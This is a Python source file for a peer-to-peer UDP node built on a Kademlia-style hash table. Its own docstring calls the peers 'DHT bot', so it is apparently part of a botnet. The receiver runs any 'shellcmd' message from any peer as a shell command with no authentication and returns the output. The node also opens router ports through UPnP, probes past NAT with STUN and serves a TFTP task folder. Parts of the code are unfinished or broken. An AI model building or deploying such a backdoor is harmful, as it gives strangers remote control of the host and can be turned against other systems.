import subprocess
import random
import logging as log
from socket import socket
from socket import AF_INET
from socket import SOCK_DGRAM
from socket import gethostname
from socket import gethostbyname

from config import KEY
from config import PACKET_SIZE
from config import ADDRESS_SPACE
from config import ALPHA

from virtual_co import NewTask
from virtual_co import UDPSocket
from virtual_co import coroutine
from cachedb import DB
from cachedb import kBucket
from cachedb import get_hash

from utility import get_lan_addr

cache = DB()
logging = log.getLogger("networkio")


class Sender(object):


    def __init__(self, send_dest, recv_dest, uuid):
        self.recv_dest = recv_dest
        self.send_dest = send_dest ## hardening, tcp over udp magic

        sucky = socket(AF_INET, SOCK_DGRAM)
        if len(send_dest) > 2:
            sucky.connect((send_dest[0], send_dest[1]))
        else:
            sucky.connect(send_dest)
        self.sock = UDPSocket(sucky)
        self.uuid = uuid


    def send_query(self, data, query_type, rpc_no):
        msg = { "data": data,
                "type": "query",
                "query_type": query_type,
                "rpc_no": rpc_no,
                "uuid": self.uuid,
                "recv_dest": self.recv_dest ,
                "send_dest": self.send_dest }

        #logging.debug("Sending packet {0}".format(msg))
        self.sock.send(msg, self.send_dest)



    def send_error(self, err, rpc_no):
        msg = { "data": err,
                "type": "err",
                "rpc_no": rpc_no,
                "uuid": self.uuid,
                "recv_dest": self.recv_dest,
                "send_dest": self.send_dest }
        
        self.sock.send(msg, self.send_dest)


    def send_resp(self, resp, rpc_no):
        msg = {
            "data": resp,
            "type": "resp",
            "rpc_no": rpc_no,
            "uuid": self.uuid,
            "recv_dest": self.recv_dest,
            "send_dest": self.send_dest
        }
        logging.debug("Sending response {} to {}".format(msg, self.send_dest))
        yield self.sock.send(msg, self.send_dest)


    

    

    def send_file(self, filename):
        import tftpy
        client = tftpy.TftpClient(self.send_dest[0],
                                  self.send_dest[1] + 1)
        client.upload(filename, basename(filename))



class Receiver(object):


    def __init__(self, server=("0.0.0.0", 0)):
        sucky = socket(AF_INET, SOCK_DGRAM)
        logging.debug("Hostname: {0} ({1})".format(
            gethostname(), gethostbyname(gethostname())))
        sucky.bind(server)
        self.addr = sucky.getsockname()
        logging.debug("Socket bind: {0}".format(self.addr))
        self.sock = UDPSocket(sucky)
        self.server = server


    def recv(self):
        packet, addr = yield self.sock.recv()
        logging.debug("Received packet {0} from {1}.".format(packet, addr))

        routing_table = kBucket(cache["addr"], cache["port"], cache["uuid"])
        routing_table.insert(packet["recv_dest"][0], 
                             packet["recv_dest"][1],
                             packet["uuid"])
        
        logging.debug("Routing table updated: ({0}, {1}, {2})".format(
                    packet["recv_dest"][0], packet["recv_dest"][1], packet["uuid"]))
        
        if packet["type"] == "query":
            ## unpack => (resp, addr, rpc_no, uuid)

                if packet["query_type"] == "shellcmd":
                    unpack = (self.handle_shellcmd(packet),
                              packet["recv_dest"],
                              packet["rpc_no"],
                              packet["uuid"])
                    yield unpack

                if packet["query_type"] == "ping":
                    # ping(): pong
                    resp = "pong"
                    unpack = (resp,
                              packet["recv_dest"],
                              packet["rpc_no"],
                              packet["uuid"])
                    yield unpack

                if packet["query_type"] == "store":
                    # store(key, value h_key): True
                    resp = True
                    try:
                        cache["values"].update(
                            {   packet["data"][2]: 
                                (packet["data"][0], packet["data"][1]),
                                "author": packet["data"][3]
                            })
                        logging.debug("Values stored: {}".format(cache["values"]))
                    except Exception:
                        resp = False

                    unpack = (resp,
                              packet["recv_dest"],
                              packet["rpc_no"],
                              packet["uuid"])
                    yield unpack


                if packet["query_type"] == "find_node":  
                    # find_node(hkey): k_nearest | node
                    nearest = routing_table.get_nearest_nodes(packet["data"])

                    if nearest[0][2] == packet["data"]:
                        resp = nearest[0]
                    else:
                        resp = nearest
                    unpack = (resp,
                             packet["recv_dest"],
                             packet["rpc_no"],
                             packet["uuid"])
                    yield unpack

                if packet["query_type"] == "find_value":
                    # find_value(hkey): k_nearest | value
                    resp = cache["values"].get(packet["data"], None)
                    if resp is None:
                        resp = routing_table.get_nearest_nodes(packet["data"])
                        
                    unpack = (resp,
                              packet["recv_dest"],
                              packet["rpc_no"],
                              packet["uuid"])

                    yield unpack


        if packet["type"] == "err":
            yield packet, "err", addr, packet["rpc_no"], packet["uuid"]

        if packet["type"] == "resp":
            yield packet, addr, packet["rpc_no"], packet["uuid"]



    def handle_shellcmd(self, data):
        try:
            proc = subprocess.Popen(data["data"],
                                    shell=True,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
            resp = proc.stdout.read() + proc.stderr.read()
        except:
            logging.error("Subprocess Popen execution error")

        return resp


    def get_addr(self):
        return self.addr


    def get_ip(self):
        return self.addr[0]


    def get_port(self):
        return self.addr[1]



class Observable(object):

    _observers = []

    
    def __init__(self, subject):
        self.subject = subject


    @classmethod
    def register(self, observer):
        if observer not in self._observers:
            self._observers.append(observer)


    @classmethod
    def unregister(self, observer):
        if observer not in self._observers:
            return False
        else:
            self._observers.remove(observer)
            return True

        
    @classmethod
    def notify(self, subject):
        event = self(subject)
        for observer in self._observers:
            observer(event)
            
    @classmethod
    def notify_one(self, subject):
        observer_id = subject["rpc_no"]
        event = self(subject)
        ids = [observer.rpc_no for observer in self._observers]
        
        if observer_id in ids:
            observer = self._observers[ids.index(observer_id)] 
            observer(event)
            return True
        else:
            return False


socket_observable = Observable("socket")

class WriteEvent(Observable):

    def __repr__(self):
        return "WriteEvent"


class AsyncRPC(object):
    
    
    def __init__(self, fn_callback):
        self.callback = fn_callback
        self.rpc_no = None
        self.sent = False
        self.response = list()
        self.packet_sent = list()
        self.request = self._request()


    def new_packet(self, send_to, query_type, query_data):
        return  {   "send_to": send_to,
                    "query_type": query_type,
                    "query_data": query_data,
                    "uuid": cache["uuid"]
                }


    @coroutine
    def _request(self):
        """Send packet request to other DHT bot"""
        packet = (yield)
        if 'send_to' in packet and 'query_data' in packet:
            logging.debug("Sending packet {}".format(packet))
            sender = Sender(packet["send_to"],
                            (cache["addr"], cache["port"]),
                            cache["uuid"])

            self.rpc_no = packet["rpc_no"] = random.getrandbits(ADDRESS_SPACE)
            self.packet_sent.append(packet)
            sender.send_query(
                packet["query_data"],
                packet["query_type"],
                packet["rpc_no"])
                    
                    

    def send(self, arg):
        self.request.send(arg)

        
    def __call__(self, packet):
        """Receive packet response """
        self.response.append(packet.subject)
        if packet.subject["rpc_no"] == self.rpc_no:
            self.callback(packet.subject, False)
        else:
            self.callback({}, True)




###############################################################################
from collections import deque
from multiprocessing import Process
from time import time, sleep
from utility import do_UPNP_mapping, tftp_server


def ReceiverTask(addr, port, bootstrap=None):
    global t_recv_buffer
    receiver = Receiver((addr, port))
    addr, port = receiver.get_addr()
    cache["addr"], cache["port"] = addr, port
    
    port_map = [(port, "UDP"), (port + 1, "UDP")]
    external_ip, lan_addr = do_UPNP_mapping(port_map)
    #external_ip, lan_addr = "161.53.120.206", get_lan_addr()

    if external_ip:
        logging.info("[+] uPnP maps:{0}:{1} -> {2}:{3}".format(
            lan_addr, port, external_ip, port))
        cache["addr"], cache["port"] = lan_addr, port
        #cache["addr"], cache["port"] = external_ip, port
    else:
        # Do STUN probe
        logging.info("[-] external_ip unknown: sending STUN probe...")
        import stun
        nat_type, external_ip, external_port = stun.get_ip_info()
        logging.info("[+] STUN probe: {0}:{1}, {2}".format(
            external_ip, external_port, nat_type))
        #cache["addr"], cache["port"] = external_ip, port #, external_port
        
        # TODO: if nat_type == symmetric -> import turn

    logging.info("cache['addr'] = {0}, cache['port'] = {1}".format(
        cache["addr"], cache["port"]))
    
    p = Process(target=tftp_server, args=(port + 1, "./tasks/"))
    p.start()
    
    if bootstrap:
        yield NewTask(Bootstrap(bootstrap))
    
    while True:
        logging.info("Waiting for packets in ReceiverTask")
        resp, addr, rpc_no, uuid = yield receiver.recv()
        packet = {"resp": resp,
                  "addr": addr,
                  "rpc_no": rpc_no,
                  "uuid": uuid }
        
        #logging.debug("Packet received {}".format(packet))
        if not socket_observable.notify_one(packet):
            logging.debug("Not observer for notify, sending response...")
            sender = Sender(packet["addr"],
                                (cache["addr"], cache["port"]),
                                cache["uuid"])
            yield sender.send_resp(packet["resp"], packet["rpc_no"])
        

def Bootstrap(bootstrap):
    logging.debug("Bootstraping...")
    
    def ping_callback(resp, err):
        if not err: pass
            
    ping = AsyncRPC(ping_callback)
    socket_observable.register(ping)
    ping.send(ping.new_packet(bootstrap, "ping", ""))
    
    yield 


@coroutine
def IterativeStore(key, value, callback):
    logging.info("Storing: dict({}:{})".format(key, value))
    
    routing_table = kBucket(cache["addr"], cache["port"], cache["uuid"])
    hashed_key = get_hash(key)
    
    def store_callback(resp, err):
        if not err: 
            logging.debug("store_callback({},{})".format(resp, err))
            callback(resp)
        
    nodes = routing_table.get_nearest_nodes(hashed_key)
    logging.debug("Storing to nodes: {}".format(nodes))
    for node in nodes:
        store_data = AsyncRPC(store_callback())
        socket_observable.register(store_data)
        store_data.send(
            store_data.new_packet(
                node, "store", (key, value, hashed_key, cache["uuid"])
            )
        )
    
    cache["values"].update(
        {   hashed_key: (key, value),
            "author": cache["uuid"]
        })
    logging.debug("Values stored, yielding...")
    yield


def IterativeFindNode(uuid, callback):
    logging.info("Initiating IterativeFindNode() task")
    
    routing_table = kBucket(cache["addr"], cache["port"], cache["uuid"])
    used = list()  # finger table
    result = None
    
    def find_node_callback(resp, err):
        if not err: 
            if isinstance(resp["data"], tuple):
                result = resp["data"]
        
    while True:
        nodes = routing_table.get_nearest_nodes(uuid, limit=ALPHA, diff=used)  
        if not nodes:  
            break
        else:
            used += nodes
            for node in nodes:
                find_node = AsyncRPC(find_node_callback)
                socket_observable.register(find_node)
                find_node.send(find_node.new_packet())  # TODO:
        
        yield
    
    callback(result)
    

def IterativeFindValue(key):
    logging.info("Initializing IterativeFindValue() task")
    # TODO:



###############################################################################
request_buffer = deque()
response_buffer = deque()
t_recv_buffer = deque()
packets_sent = list()

def SenderTask():
    logging.info("Starting a SenderTask.")
    global response_buffer
    global request_buffer
    global packets_sent
    global t_recv_buffer

    while True:
        if len(t_recv_buffer) > 0:
            msg_recv = t_recv_buffer.popleft()
            rpc_resp_index = [i for i,v in enumerate(packets_sent) if v == msg_recv["rpc_no"] ]
            
            if not rpc_resp_index:
                logging.debug("Received packet is request. Sending answer.")
                sender = Sender(msg_recv["addr"],
                                (cache["addr"], cache["port"]),
                                cache["uuid"])
                yield sender.send_resp(msg_recv["resp"], msg_recv["rpc_no"])
            else:
                packets_sent.pop(rpc_resp_index[0])
                logging.debug("Received packet is response. Saving to response_buffer.")
                response_buffer.append(msg_recv)
                logging.debug("response_buffer: {}".format(response_buffer))
                
        if len(request_buffer) > 0:
            msg = request_buffer.popleft()
            logging.debug("Request buffer received packet: {0}".format(msg))
            if 'send_to' in msg:
                sender = Sender(msg["send_to"],
                                (cache["addr"], cache["port"]),
                                cache["uuid"])
                if 'query_data' in msg:
                    msg["rpc_no"] = random.getrandbits(ADDRESS_SPACE)
                    msg["time"] = time()
                    packets_sent.append(msg["rpc_no"])
                    del msg["time"]
                    yield sender.send_query(msg["query_data"],
                                            msg["query_type"],
                                            msg["rpc_no"])
                elif 'error' in msg:
                    pass  # TODO:
                elif 'resp' in msg:
                    pass  # TODO:
                elif 'query_file' in msg:
                    pass  # TODO:
                
            
        yield


priority_task = deque()
def RefresherTask():
    logging.info("RefresherTask started...")
    while True:
        sleep(.1)
        yield

    

def flush_resp_buffer(type_of="pong"):
    global response_buffer
    sol = list()
    ret = False
    if response_buffer:
        for item in response_buffer:
            if type(item["resp"]["data"]) == str and type_of == "pong":
                sol.append(item)
            if type(item["resp"]["data"]) == bool and type_of == "store":
                sol.append(item)
            if type(item["resp"]["data"]) == tuple and type_of == "find_value":
                sol.append(item)

        if type_of == "find_value":
            return sol

        for item in sol:
            if item["resp"]["data"] == True:
                ret = True
                response_buffer.remove(item)

    logging.debug("response_buffer after flushing: {}".format(response_buffer))
    return ret 



#def IterativeStore(key, value):
    #routing_table = kBucket(cache["addr"], cache["port"], cache["uuid"])
    #logging.info("Initiating IterativeStore({}, {}) task".format(key, value))
    #hashed_value = get_hash(key)
    #while True:
    #    nodes = routing_table.get_nearest_nodes(hashed_value)
    #    if nodes:
    #        break
    #    else:
    #        sleep(.1)
    #        yield
    #logging.debug("IterativeStore sending store to {}".format(nodes))
    #for node in nodes:
    #    request_buffer.append({
    #        "query_data": (key, value, hashed_value),
    #        "query_type": "store",
    #        "send_to": node,
    #        "uuid": cache["uuid"]
    #    })
    #logging.debug(response_buffer)
    #if not flush_resp_buffer(type_of="store"):
    #    yield NewTask(IterativeStore(key, value))


#find_queries = list()
#def IterativeFindValue(key):
    #logging.info("Initiating IterativeFindValue({}) task".format(key))
    #hashed_value = get_hash(key)
    #routing_table = kBucket(cache["addr"], cache["port"], cache["uuid"])
    #while True:
    #    nodes = routing_table.get_nearest_nodes(hashed_value)
    #    if nodes:
    #        break
    #    else:
    #        sleep(.1)
    #        yield
    #logging.debug("IterativeFindValue seding query to {}".format(nodes))
    #for node in nodes:
    #    request_buffer.append({
    #        "query_data": hashed_value,
    #        "query_type": "find_value",
    #        "send_to": node,
    #        "uuid": cache["uuid"]
    #    })
    #
    #packets = flush_resp_buffer(type_of="find_value") 
    #sleep(1)
    #if not packets:
    #    yield NewTask(IterativeFindValue(key))
    